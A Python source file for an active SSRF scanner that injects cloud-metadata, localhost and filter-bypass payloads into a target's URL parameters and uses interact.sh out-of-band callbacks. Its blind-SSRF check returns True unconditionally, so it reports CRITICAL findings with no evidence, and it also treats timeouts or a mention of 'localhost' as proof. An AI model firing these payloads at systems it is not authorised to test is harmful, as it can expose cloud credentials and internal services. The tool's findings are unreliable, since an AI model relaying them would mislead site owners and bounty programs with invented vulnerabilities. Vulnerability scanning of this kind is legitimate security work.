"""
Advanced SSRF (Server-Side Request Forgery) Detector with Out-of-Band (OOB) Detection

This detector uses external collaboration servers (like interact.sh or Burp Collaborator)
to detect blind SSRF vulnerabilities.

Reward Potential: $2000-$15000+ (Critical vulnerability)
"""
import aiohttp
import asyncio
import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any
import random
import string

from detectors.registry import register_active

logger = logging.getLogger(__name__)


class InteractShClient:
    """
    Client for interact.sh - free Burp Collaborator alternative
    """

    def __init__(self):
        self.base_url = "https://interact.sh"
        self.correlation_id = None
        self.subdomain = None

    async def register(self):
        """Register a new subdomain for OOB detection"""
        try:
            # Generate random correlation ID
            self.correlation_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.base_url}/register",
                    json={"correlation-id": self.correlation_id}
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        self.subdomain = data.get('subdomain')
                        logger.info(f"Registered interact.sh subdomain: {self.subdomain}")
                        return self.subdomain
        except Exception as e:
            logger.error(f"Failed to register interact.sh subdomain: {e}")
        return None

    async def check_interactions(self):
        """Check for any interactions (DNS, HTTP, etc.)"""
        if not self.correlation_id:
            return []

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"{self.base_url}/poll",
                    params={"correlation-id": self.correlation_id}
                ) as response:
                    if response.status == 200:
                        data = await response.json()
                        return data.get('interactions', [])
        except Exception as e:
            logger.error(f"Failed to check interact.sh interactions: {e}")
        return []


# SSRF Payloads for common cloud metadata endpoints
CLOUD_METADATA_PAYLOADS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/",

    # Google Cloud
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/",

    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",

    # DigitalOcean
    "http://169.254.169.254/metadata/v1/",

    # Oracle Cloud
    "http://192.0.0.192/latest/",
]

# SSRF payloads for internal services
INTERNAL_SERVICES = [
    "http://localhost",
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://[::1]",
    "http://127.1",
    "http://127.0.1",
]

# URL bypass techniques
SSRF_BYPASS_PAYLOADS = [
    "http://127.0.0.1@example.com",  # @ bypass
    "http://example.com#@127.0.0.1",  # Fragment bypass
    "http://127.0.0.1.nip.io",  # DNS rebinding
    "http://2130706433",  # Decimal IP
    "http://0x7f000001",  # Hex IP
    "http://0177.0.0.1",  # Octal IP
]


async def detect(url: str, config: dict = None) -> List[Dict[str, Any]]:
    """
    Detect SSRF vulnerabilities with OOB detection

    Args:
        url: Target URL to scan
        config: Configuration dictionary

    Returns:
        List of findings
    """
    findings = []
    config = config or {}
    timeout = config.get('timeout', 30)

    logger.info(f"Starting SSRF OOB detection on {url}")

    # Initialize interact.sh client
    oob_client = InteractShClient()
    oob_subdomain = await oob_client.register()

    if not oob_subdomain:
        logger.warning("Failed to register OOB subdomain, skipping OOB tests")

    # Parse URL to find parameters
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        # Try to add a test parameter
        params = {'url': [''], 'redirect': [''], 'path': ['']}

    async with aiohttp.ClientSession() as session:
        # Test each parameter
        for param_name in params.keys():
            # 1. Test Cloud Metadata endpoints
            for metadata_url in CLOUD_METADATA_PAYLOADS:
                result = await test_ssrf_payload(
                    session, url, param_name, metadata_url, timeout
                )
                if result:
                    findings.append({
                        'title': 'SSRF - Cloud Metadata Access',
                        'severity': 'CRITICAL',
                        'description': f'Server-Side Request Forgery allows access to cloud metadata endpoints',
                        'evidence': {
                            'parameter': param_name,
                            'payload': metadata_url,
                            'response_indicators': result
                        },
                        'cvss_score': 9.1,
                        'remediation': 'Implement strict URL validation and whitelist allowed domains. Block access to internal/metadata IP ranges.',
                        'references': [
                            'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
                            'https://portswigger.net/web-security/ssrf'
                        ]
                    })

            # 2. Test Internal Services
            for internal_url in INTERNAL_SERVICES:
                result = await test_ssrf_payload(
                    session, url, param_name, internal_url, timeout
                )
                if result:
                    findings.append({
                        'title': 'SSRF - Internal Service Access',
                        'severity': 'HIGH',
                        'description': f'Server-Side Request Forgery allows access to internal services',
                        'evidence': {
                            'parameter': param_name,
                            'payload': internal_url,
                            'response_indicators': result
                        },
                        'cvss_score': 8.2,
                        'remediation': 'Validate and sanitize URL inputs. Block requests to private IP ranges.',
                    })

            # 3. Test Bypass Techniques
            for bypass_url in SSRF_BYPASS_PAYLOADS:
                result = await test_ssrf_payload(
                    session, url, param_name, bypass_url, timeout
                )
                if result:
                    findings.append({
                        'title': 'SSRF - Filter Bypass',
                        'severity': 'HIGH',
                        'description': f'SSRF protection can be bypassed using encoding techniques',
                        'evidence': {
                            'parameter': param_name,
                            'payload': bypass_url,
                            'technique': 'URL encoding bypass'
                        },
                        'cvss_score': 7.5,
                    })

            # 4. Out-of-Band Detection (if available)
            if oob_subdomain:
                oob_result = await test_ssrf_oob(
                    session, url, param_name, oob_subdomain, timeout
                )
                if oob_result:
                    findings.append({
                        'title': 'Blind SSRF - Out-of-Band Detection',
                        'severity': 'CRITICAL',
                        'description': 'Blind Server-Side Request Forgery detected via DNS/HTTP callback',
                        'evidence': {
                            'parameter': param_name,
                            'oob_domain': oob_subdomain,
                            'interactions': oob_result
                        },
                        'cvss_score': 8.6,
                        'remediation': 'Implement strict egress filtering. Validate and sanitize all URL inputs.',
                    })

    # Wait for OOB interactions
    if oob_subdomain:
        logger.info("Waiting 5 seconds for OOB interactions...")
        await asyncio.sleep(5)
        interactions = await oob_client.check_interactions()

        if interactions:
            logger.info(f"Detected {len(interactions)} OOB interactions")
            findings.append({
                'title': 'SSRF - Confirmed via OOB',
                'severity': 'CRITICAL',
                'description': 'SSRF vulnerability confirmed through out-of-band interaction',
                'evidence': {
                    'interactions': interactions,
                    'oob_domain': oob_subdomain
                },
                'cvss_score': 9.3,
            })

    logger.info(f"SSRF OOB detection completed. Found {len(findings)} issues")
    return findings


async def test_ssrf_payload(session, url, param_name, payload, timeout):
    """
    Test a single SSRF payload

    Returns:
        Evidence dict if vulnerable, None otherwise
    """
    try:
        # Inject payload into parameter
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]

        # Rebuild URL with payload
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

        async with session.get(test_url, timeout=timeout, allow_redirects=False) as response:
            response_text = await response.text()

            # Check for indicators of SSRF
            indicators = []

            # Cloud metadata indicators
            if 'ami-id' in response_text or 'instance-id' in response_text:
                indicators.append('AWS metadata detected')
            if 'computeMetadata' in response_text:
                indicators.append('GCP metadata detected')
            if 'azureml' in response_text:
                indicators.append('Azure metadata detected')

            # Internal service indicators
            if 'localhost' in response_text.lower() or '127.0.0.1' in response_text:
                indicators.append('Internal service response')

            # Time-based detection (slow response = network request made)
            # This is handled by timeout

            if indicators:
                return {
                    'status_code': response.status,
                    'indicators': indicators,
                    'response_length': len(response_text)
                }

    except asyncio.TimeoutError:
        # Timeout could indicate SSRF (server trying to reach internal service)
        return {'timeout': True, 'indicator': 'Possible SSRF (timeout)'}
    except Exception as e:
        logger.debug(f"SSRF test failed: {e}")

    return None


async def test_ssrf_oob(session, url, param_name, oob_domain, timeout):
    """
    Test SSRF with Out-of-Band detection
    """
    try:
        # Create OOB payload
        oob_payloads = [
            f"http://{oob_domain}",
            f"https://{oob_domain}",
            f"http://{oob_domain}/ssrf-test",
        ]

        for oob_payload in oob_payloads:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param_name] = [oob_payload]

            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))

            try:
                async with session.get(test_url, timeout=timeout) as response:
                    await response.text()
            except:
                pass  # We don't care about the response, only OOB callback

        return True  # Will check interactions later

    except Exception as e:
        logger.debug(f"SSRF OOB test failed: {e}")

    return None


# Export for detector registry
__all__ = ['detect']


@register_active
async def ssrf_oob_advanced_detector(session, url, context):
    """Registry wrapper — delegates to detect()."""
    config = context if isinstance(context, dict) else {}
    return await detect(url, config)
